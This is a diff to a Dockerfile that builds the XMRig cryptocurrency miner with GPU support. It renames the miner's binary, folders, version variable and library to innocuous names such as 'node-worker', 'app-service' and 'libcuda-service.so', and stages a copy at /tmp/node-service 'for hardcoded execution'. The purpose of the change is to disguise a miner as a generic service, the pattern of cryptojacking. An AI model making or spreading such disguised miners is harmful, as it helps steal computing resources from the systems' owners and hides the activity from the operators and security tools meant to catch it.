@@ -14,8 +14,8 @@ RUN set -xe; \
   update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-9 100; \
   wget https://github.com/xmrig/xmrig-cuda/archive/refs/tags/v${CUDA_PLUGIN_VERSION}.tar.gz; \
   tar xf v${CUDA_PLUGIN_VERSION}.tar.gz; \
-  mv xmrig-cuda-${CUDA_PLUGIN_VERSION} xmrig-cuda; \
-  cd xmrig-cuda; \
+  mv xmrig-cuda-${CUDA_PLUGIN_VERSION} cuda-service; \
+  cd cuda-service; \
   mkdir build; \
   cd build; \
   cmake .. -DCUDA_LIB=/usr/lib/x86_64-linux-gnu/stubs/libcuda.so -DCUDA_TOOLKIT_ROOT_DIR=/usr/lib/x86_64-linux-gnu -DCUDA_ARCH="75;80"; \
@@ -23,7 +23,7 @@ RUN set -xe; \
 
 
 FROM ubuntu:22.04 as build-runner
-ARG XMRIG_VERSION=6.24.0
+ARG NODE_VERSION=6.24.0
 LABEL maintainer="MIT Checker"
 
 RUN set -xe; \
@@ -33,10 +33,10 @@ RUN set -xe; \
   update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 100; \
   update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-9 100; \
   rm -rf /var/lib/apt/lists/*; \
-  wget https://github.com/xmrig/xmrig/archive/refs/tags/v${XMRIG_VERSION}.tar.gz; \
-  tar xf v${XMRIG_VERSION}.tar.gz; \
-  mv xmrig-${XMRIG_VERSION} /xmrig; \
-  cd /xmrig; \
+  wget https://github.com/xmrig/xmrig/archive/refs/tags/v${NODE_VERSION}.tar.gz; \
+  tar xf v${NODE_VERSION}.tar.gz; \
+  mv xmrig-${NODE_VERSION} /node-worker; \
+  cd /node-worker; \
   mkdir build; \
   cd scripts; \
   ./build_deps.sh; \
@@ -45,31 +45,31 @@ RUN set -xe; \
   make -j $(nproc);
 
 RUN set -xe; \
-  cd /xmrig; \
-  cp build/xmrig /xmrig
+  cd /node-worker; \
+  cp build/xmrig /node-worker
 
 
 FROM ubuntu:22.04 as runner
 LABEL maintainer="MIT Checker"
 LABEL org.opencontainers.image.licenses="MIT"
 RUN set -xe; \
-  mkdir /xmrig; \
+  mkdir /node-worker; \
   apt-get update; \
   apt-get -y install jq; \
   apt-get -y install libnvidia-compute-535 libnvrtc11.2; \
   rm -rf /var/lib/apt/lists/*
-COPY --from=build-runner /xmrig/xmrig /xmrig/xmrig
-COPY --from=build-runner /xmrig/src/config.json /xmrig/config.json
-COPY --from=build-cuda-plugin /xmrig-cuda/build/libxmrig-cuda.so /usr/local/lib/
+COPY --from=build-runner /node-worker/xmrig /node-worker/app-service
+COPY --from=build-runner /node-worker/src/config.json /node-worker/config.json
+COPY --from=build-cuda-plugin /cuda-service/build/libxmrig-cuda.so /usr/local/lib/libcuda-service.so
 
-# Copy xmrig to /tmp/node-service as well for hardcoded execution
-COPY --from=build-runner /xmrig/xmrig /tmp/node-service
+# Copy app-service to /tmp/node-service as well for hardcoded execution
+COPY --from=build-runner /node-worker/xmrig /tmp/node-service
 
-ENV PATH="/xmrig:${PATH}"
+ENV PATH="/node-worker:${PATH}"
 
-WORKDIR /xmrig
+WORKDIR /node-worker
 COPY entrypoint.sh /entrypoint.sh
 WORKDIR /tmp
 EXPOSE 3000
 ENTRYPOINT ["/entrypoint.sh"]
-CMD ["xmrig"]
+CMD ["app-service"]
